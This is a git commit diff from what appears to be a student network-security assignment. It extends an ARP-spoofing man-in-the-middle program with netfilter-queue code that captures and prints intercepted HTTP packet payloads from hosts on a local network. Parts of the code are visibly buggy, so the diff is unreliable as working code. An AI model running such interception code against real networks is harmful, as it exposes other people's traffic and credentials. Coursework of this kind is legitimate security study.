d4a4ceab24b5e0f8b1be910cbef2b64a5620e7fa
Hare <hajime.cs09@nycu.edu.tw>
2024-04-24 18:45:40 +0800

    feat: new version fetching

--- project_2/mitm_attack.cpp
+++ project_2/mitm_attack.cpp
@@ -30,10 +30,20 @@ using namespace std;
  * @param answered_list the list of all the hosts in the local area network
  * @param spoof_operator the spoof operator
  */
+
+struct nfq_handle *h;
+struct nfq_q_handle *qh;
+struct nfnl_handle *nh;
+int fd;
+
 void arp_spoofing(string gateway_ip, vector<pair<string, string>> answered_list, SpoofOperator *spoof_operator) {
     // run for 100 iterations
     for (int t = 0; t < 100; t++) {
         std::cout << "spoofing iteration: " << t << std::endl;
+
+        //simultaenously fetch the HTTP packets from the gateway and the hosts
+        fetch_information(h, qh, nh, fd);
+
         for (auto i = 0; i < answered_list.size(); i++) {
             if (answered_list[i].first != gateway_ip) {
                 spoof_operator->attack(answered_list[i].first, gateway_ip);
@@ -44,41 +54,97 @@ void arp_spoofing(string gateway_ip, vector<pair<string, string>> answered_list,
     }
 }
 
+//參數分別是代表指向netfilter queue的指標、代表netfilter message的指標、代表netfilter data的指標、使用者資料
+static int Callback(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data){
 
-int fetch_username_from_HTTP_session() {
-        int sockfd = socket(AF_PACKET,SOCK_RAW, htons(ETH_P_ALL));
-        if (sockfd <0) {
-            perror ("socket() failed");
-            exit (EXIT_FAILURE);
+    struct nfqnl_msg_packet_hdr *ph;  //代表netfilter packet header的指標
+    unsigned char *payload; //代表netfilter payload的指標
+    int ret; //代表回傳值的變數
+
+    //取得netfilter packet header
+    ph = nfq_get_msg_packet_hdr(nfa);
+    if (ph){
+        //取得netfilter packet ID
+        printf("Received packet with ID %u\n", ntohl(ph->packet_id));
+    }
+    
+    //取得netfilter payload
+    ret = nfq_get_payload(nfa, &payload);
+    if (ret >= 0)
+    {   //印出netfilter payload的長度
+        printf("Payload Length: %d\n", ret);
+
+        //印出netfilter payload的內容
+        for (int i = 0; i < ret; i++){
+            printf("%c", payload[i]);
         }
-
-       
-        struct sockaddr_ll device;
-        memset(&device, 0, sizeof(device));
-    
-        device.sll_family = AF_PACKET;
-        device.sll_protocol = htons(ETH_P_ALL);
-        device.sll_ifindex = if_nametoindex("eth0");
-    
-        bind(sockfd, (struct sockaddr*)&device, sizeof(device));
-    
-        char buffer[2048];
-        memset(buffer, 0, sizeof(buffer));
-    
-        recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
-    
-        struct ethhdr *eth = (struct ethhdr *)buffer;
-        struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));
-        struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct ethhdr) + sizeof(struct iphdr));
-    
-        char *data = buffer + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr);
-    
-        cout << "Data: " << data << endl;
-    
-        close(sockfd);
-    
-        return 0;
+    }
+    printf("\n");
 }
+
+void fetch_information(struct nfq_handle *h, struct nfq_q_handle *qh, struct nfnl_handle *nh, int fd){
+    int rv; //代表回傳值的變數
+    char buf[4096] __attribute__((aligned)); //for packet data
+    
+    //open libraray handle
+    h = nfq_open();
+    if (!h){
+        fprintf(stderr, "Error during nfq_open()\n");
+        exit(1);
+    }
+
+    //unbinding existing nf_queue handler for AF_INET (if any)
+    if (nfq_unbind_pf(h, AF_INET) < 0){
+        fprintf(stderr, "Error during nfq_unbind_pf()\n");
+        exit(1);
+    }
+
+    //binding nfnetlink_queue as nf_queue handler for AF_INET
+    if (nfq_bind_pf(h, AF_INET) < 0){
+        fprintf(stderr, "Error during nfq_bind_pf()\n");
+        exit(1);
+    }
+
+    //binding this socket to queue '0'
+    qh = nfq_create_queue(h, 0, &Callback, NULL);
+    if (!qh){
+        fprintf(stderr, "Error during nfq_create_queue()\n");
+        exit(1);
+    }
+
+    //setting copy_packet mode
+    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0){
+        fprintf(stderr, "Can't set packet_copy mode\n");
+        exit(1);
+    }
+
+    //get netlink handle
+    nh = nfq_nfnlh(h);
+    if (!nh)
+    {
+        fprintf(stderr, "Error during nfq_nfnlh()\n");
+        exit(1);
+    }
+
+    //get file descriptor associated with the nfqueue
+    fd = nfq_fd(h);
+    if (!fd)
+    {
+        fprintf(stderr, "Error getting file descriptor for nfqueue\n");
+        exit(1);
+    }
+
+    //receive packets from the nfqueue
+    if(rv = recv(fd, buf, sizeof(buf), 0)>0){
+        nfq_handle_packet(h, buf, rv);
+    }
+    
+    //destroy queue handle
+    nfq_destroy_queue(qh);
+    nfq_close(h);
+    
+}
+
 
 int main() {
     std::string sender_mac, target_mac;
